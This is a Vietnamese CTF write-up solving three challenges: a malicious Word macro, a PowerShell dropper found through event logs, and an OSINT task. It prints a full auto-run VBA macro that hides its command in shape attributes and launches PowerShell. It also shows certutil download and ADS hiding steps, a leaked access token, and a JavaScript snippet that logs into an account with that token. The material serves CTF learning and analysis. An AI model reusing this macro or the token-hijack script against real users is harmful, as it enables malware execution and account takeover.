# KCSC CTF 2023 write-up

## Forensics

### Tin học văn phòng ###

![](https://hackmd.io/_uploads/ByxC0dkS3.png)

Bài này cho mình file zip (ban đầu không để ý cái "Zip password" nên là mình tưởng nó là dạng crackzip nên crack cả buổi xong vào xem lại mới thấy :)))) ).

Sau khi giải nén với password mà đề bài cho thì mình có được file ``Flag.docm``.

![](https://hackmd.io/_uploads/rySu1FkH2.png)

Nhìn định dạng file thì mình có thể giả định rằng `` mã độc tống tiền nguy hiểm nhất năm 2023`` là 1 dạng VBA malicious macro. Và bộ công cụ phổ biến nhất để phân tích nó là ``oletools``, và mình dùng cụ thể ở đây là ``olevba``.

Mình nhập lệnh ``olevba Flag.docm`` để phân tích. Olevba còn có 1 vài option như -a, -c, -d, --decode, --deobf,...tùy vào mục đích của người dùng, ở đây mình cần tool in ra cả code lẫn phân tích nên không dùng tùy chọn.

```
$ olevba Flag.docm
XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Flag.docm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls
in file: word\vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas
in file: word\vbaProject.bin - OLE stream: 'VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
'Flag format: KCSC{H1_1m_sUcky_+$phlac}'
Sub Auto_Open()
On Error Resume Next
Dim objCmdShape As Shape
Dim hiddenkey As Long
Dim cmdParams() As String
Dim cmdCommand As String
Dim cmdType As String
Dim cmdObj As Object
hiddenkey = RGB(13, 3, 7)
If Val(Application.Version) > 14 Then
    For x = 1 To ActiveDocument.Shapes.Count
        Set objCmdShape = ActiveDocument.Shapes(x)
        If objCmdShape.Shadow.ForeColor.RGB = hiddenkey Then
            cmdType = objCmdShape.Name
            cmdCommand = objCmdShape.AlternativeText
            cmdParams = Split(objCmdShape.TextFrame.TextRange.Text, "|")
            Set cmdObj = Interaction.CreateObject(cmdType)
            VBA$.[Interaction].CallByName! cmdObj, [cmdCommand], VbMethod, "PoWerShElL", Trim(cmdParams(0)), cmdParams(1), cmdParams(2)
            objCmdShape.Delete
            Exit For
        End If
    Next
Else
    MsgBox "Microsoft Word is not installed on this computer or its version is lower than Microsoft Word 2013", vbCritical
    Application.Quit
End If
End Sub
Sub AutoOpen()
    Auto_Open
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|PoWerShElL          |May run PowerShell commands                  |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|CallByName          |May attempt to obfuscate malicious function  |
|          |                    |calls                                        |
+----------+--------------------+---------------------------------------------+
```

Trong đoạn code nó có cái flag format (``Flag format: KCSC{H1_1m_sUcky_+$phlac}``), mình có submit thử thì không được (nếu dễ vậy sao có thể là challenge a Long đc), nên mình đọc code và thấy có đoạn gọi PowerShell:

```
 VBA$.[Interaction].CallByName! cmdObj, [cmdCommand], VbMethod, "PoWerShElL", Trim(cmdParams(0)), cmdParams(1), cmdParams(2)
 ```
Olevba cũng phân tích là ``Suspicious|PoWerShElL          |May run PowerShell commands``. Nên mình giả định rằng macro đã thực thi 1 script PowerShell để thực hiện 1 số quy trình sau đấy và mình cần tìm ra script này để xem cách nó hoạt động. 

Tiếp theo mình đổi tên file ``Flag.docm`` thành ``Flag.zip`` và giải nén ra. Sau 1 hồi tìm kiếm thì mình tìm thấy tập tin tên là ``Document.xml`` 

![](https://hackmd.io/_uploads/S1bGEKkSn.png)

Mình mở lên xem và để ý có 2 dòng mã hóa bằng Base64.

![](https://hackmd.io/_uploads/Sy6SVFkSh.png)

Dùng cyberchef để decode nó thì xác định đây chính là script PowerShell. Tuy nhiên thì nó thiếu mất 1 phần, thì phần đấy chính là đoạn base64 sau. Lúc đầu mình decode 2 cái chuỗi riêng biệt thì cái đầu ra đoạn code PowerShell còn cái còn lại bị lỗi :v. 

![](https://hackmd.io/_uploads/SykRvtkBh.png)

Mình dán đoạn base64 tiếp sau đoạn base64 trước thì ra script hoàn chỉnh. 

![](https://hackmd.io/_uploads/r15OOKyB2.png)

Mình tải output của CyberChef về với tên là ``Flag.ps1``.

![](https://hackmd.io/_uploads/BJ_gKYkrh.png)

Đoạn code này đã bị obfuscated, tuy nhiên thì mình có thể dễ dàng deobfuscate nó với công cụ [PSDecode](https://github.com/R3MRUM/PSDecode).

Dùng tool không set option nó hiện cái này :v 

![](https://hackmd.io/_uploads/ByGOlq1B2.png)

Sau đấy nó mở cái link youtube: https://www.youtube.com/watch?v=BMEdBpRqs4k :))))

Đây là đoạn script sau khi nó deobfuscate. Và flag nằm trong biến ${phlac}

![](https://hackmd.io/_uploads/rJT3gc1S3.png)

Gắn flag trong biến $phlac vào trong flag format 

Flag: ``KCSC{H1_1m_sUcky_Tr0ll_m4lw@r3_y0u_g0t_m3_ah1Hi}``

### Dropper ###

![](https://hackmd.io/_uploads/HyAab5yr3.png)

Bài này first solve :^) 

![](https://hackmd.io/_uploads/S1dkGq1Sh.png)

Bài này cho mình 1 file ``zip`` và sau khi giải nén xong thì mình có đươc một file ổ đĩa ảo (vhdx).

Vì đề bài không có description gì sất nên mình hơi tốn thời gian để xác định xem bài này phải làm gì. Thì sau 1 hồi suy nghĩ và tìm kiếm cụm từ ``Dropper ctf`` thì tìm thấy 

![](https://hackmd.io/_uploads/SyQ279JHh.png)

Sau khi xác định nó liên quan tới mã độc thì mình tìm kiếm thông tin về khái niệm ``dropper`` (A dropper is a kind of Trojan that has been designed to "install" malware (virus, backdoor, etc.) to a computer.). Đến đây thì mình biết phải làm gì rồi.

Với những bài mã độc thì đầu tiên mình sẽ check ``sysmon event log``. 

``C\Windows\System32\winevt\logs``

Mình tìm kiếm 1 hồi thì thấy lệnh ``whoami``, đây là 1 lệnh mà sau khi hacker truy cập được vào máy nạn nhân sử dụng. 

![](https://hackmd.io/_uploads/Byohr51S3.png)

Dò theo parent process ID 4764 của CMD. Ở đây CMD được thực thi thông qua PsExec, *là công cụ rất mạnh dùng để chạy cmd trên máy remote và người dùng sẽ không hề hay biết*. 

![](https://hackmd.io/_uploads/rkHgdqyBh.png)

Okay, vậy là mình đã hiểu vấn đề rồi, tiếp theo mình sẽ phân tích xem hacker đã chạy những lệnh nào và làm gì trên máy nạn nhân.

Hacker đã chạy các lệnh như ``whoami``, ``ipconfig``, ``systeminfo``, ``ping``. Và đặc biệt là certutil.exe để tải về ``twenty.ps1``

![](https://hackmd.io/_uploads/rkGB9qJH3.png)

Dò thêm 1 chút thì thấy ở đây hacker đã add nội dung của ``twenty.ps1`` vào ADS. 

![](https://hackmd.io/_uploads/BJbYiqkBn.png)

Sau đó hacker thực thi ``twenty.ps1``

![](https://hackmd.io/_uploads/BJajgsJSn.png)

Okay, vậy giờ mình sẽ tìm kiếm file ``readme.txt`` trong thư mục ``C:\Users\Public\ChromeUpdate\``. Và xem stream ẩn bên trong nó.

![](https://hackmd.io/_uploads/ByyIziyr2.png)

Mình dùng lệnh ``esentutl.exe /Y readme.txt:twenty.ps1 /d twenty.ps1 /o`` để retrieve ``twenty.ps1``

![](https://hackmd.io/_uploads/BJDdIsJrh.png)

Và vì ``twenty.ps1`` là file ``.cab``

![](https://hackmd.io/_uploads/S136UjkSn.png)

Nên mình sẽ đổi đuôi thành ``.cab`` và giải nén. Sau khi giải nén thì mình có được ``twenty.ps1`` hàng real. 

![](https://hackmd.io/_uploads/Hk-xDo1Bh.png)

Mở lên bằng ISE, và phân tích sơ qua về đoạn code này:
![](https://hackmd.io/_uploads/BkaMDo1Bn.png)

Đầu tiên thì chương trình sẽ giải mã đoạn string bị mã hóa aes 128 cbc.
![](https://hackmd.io/_uploads/S1VPPiyrn.png)

Sau đó xuất ra file thực thi và thực thi nó.
![](https://hackmd.io/_uploads/SJOKvsJSh.png)

Mình sửa đổi đoạn code để xem nội dung file vừa tạo ra.

![](https://hackmd.io/_uploads/HyM93jJSh.png)

Sau khi mở ra thì mình lại thấy nội dung như file ``twenty.ps1``

![](https://hackmd.io/_uploads/BkMYznyBh.png)


Thế là mình đổi tên là ``twenty2.ps1`` và tiếp tục sửa code.

Nội dung của file thứ 3 cũng y chang.

![](https://hackmd.io/_uploads/HJBIcj1H3.png)

Và lúc này mình mới để ý cái tên là ``twenty.ps1``, twenty = 20, mình nghĩ chạy khoảng 20 cái PowerShell như thế này là xong. Và thế là mình bắt đầu công cuộc hành xác :))).

![](https://hackmd.io/_uploads/BkRae2kHn.png)


Sau 1 khoảng lặp đi lặp lại việc tạo ra file ``.ps1`` mới và sửa code sau đó lại tiếp tục...Mình cũng xong, và script cuối cùng (twenty20.ps1) tạo ra 1 file ``.ps1`` có nội dung khác với các file còn lại. Đoạn script này đơn giản là nó sẽ tạo ra file nếu computer name tương ứng.

![](https://hackmd.io/_uploads/r1TDno1Bn.png)

Mình copy nội dung bị mã hóa base64 và ném vào cyberchef để decode base64 thì thấy rằng  đây là data của file JPG.

![](https://hackmd.io/_uploads/BkmP6oyBn.png)

Tải về với đuôi là ``.jpg``, mở lên và lấy flag.

![](https://hackmd.io/_uploads/HkykZ2yS3.jpg)

Flag: ``KCSC{Som3one's_thr0ugh1s_KMA_don't_have_researcher?}``

Cách khác:

Đó là copy đoạn script từ PowerShell event log. Vì nội dung file khá lớn nên phải chia ra  thành từng mục. Và file cuối cùng trong event log tương ứng vói file twenty thứ 20.

![](https://hackmd.io/_uploads/H131X3kr2.png)

Lúc thi mình  nghĩ tới cách làm này sau khi in cái twenty thứ 2 mà sợ copy thiếu data nên thôi.

## Misc

### Shackles ###

![](https://hackmd.io/_uploads/HJVu721Hn.png)

Tìm kiếm nickname này trên Twitter. Đọc sơ qua trang cá nhân ta có thể thấy người này tên là Ong Ngạch...nhầm angok. Hắn leak database của công ty B giấu tên và bán full data với giá là 100k.

![](https://hackmd.io/_uploads/By0jQhyB3.png)

Nhấp vào link gist bên dưới, ta có thể thấy được raw data của file ``BK**-employee-data.json``

![](https://hackmd.io/_uploads/H1m84nkrn.png)

Đề bài có nói là tên truongangok này đã rò rỉ thông tin xác thực của hắn và ta có thể dùng thông tin đấy để truy cập tài khoản của hắn.

Đọc kỹ đống database mình không thấy có gì lạ. Nên mình chú ý tới cái đoạn ``justatree781 is my nickname`` trong trang cá nhân của hắn. Justatree...Just-A-Tree, hmm.

Mình bỏ xem raw và nhấp vào trang gist của angok thì thấy avatar là trận MU thua Liver 0-5 :))). Justatree781 tạo 1 file secret tên là ``gist.md`` chứa link raw của database và 1 vài tool get hidden channel discord sử dụng access token.

![](https://hackmd.io/_uploads/BygKS21H3.png)

Bấm vào thì thấy không có gì đặc biệt.

![](https://hackmd.io/_uploads/BynVUhJS3.png)

Tuy nhiên sau khi bỏ raw thì khác. Mình thấy phía dưới là đoạn hội thoại giữa tác giả angok và fan của angok. Nội dung xoay quanh việc anh ta không chạy được tool và phải nhờ tác giả chỉ cho chạy, qua đó vô tình lộ ra Access Token.

![](https://hackmd.io/_uploads/ByBuIn1B2.png)
![](https://hackmd.io/_uploads/HJoiLnyS3.png)

Access Token: ``MTA0OTI2NDEwOTIxODE4NTI0Nw.GYYIn3.fO2pfn9HuvHhfV1IWnfbNzVh9ZSE75XhM5dnLs``

Đoạn script để chèn vào console

```javascript 
function login(token) {
setInterval(() => {
document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
}, 50);
setTimeout(() => {
location.reload();
}, 2500);
}

login('MTA0OTI2NDEwOTIxODE4NTI0Nw.GYYIn3.fO2pfn9HuvHhfV1IWnfbNzVh9ZSE75XhM5dnLs')
```

![](https://hackmd.io/_uploads/S1INvhkBn.png)

Bùm, đăng nhập thành công.

![](https://hackmd.io/_uploads/H1EpS01B2.png)

![](https://hackmd.io/_uploads/HyDCB0JSh.png)

Flag: ``KCSC{K3ep_ur_t0k3N_s@fE}``

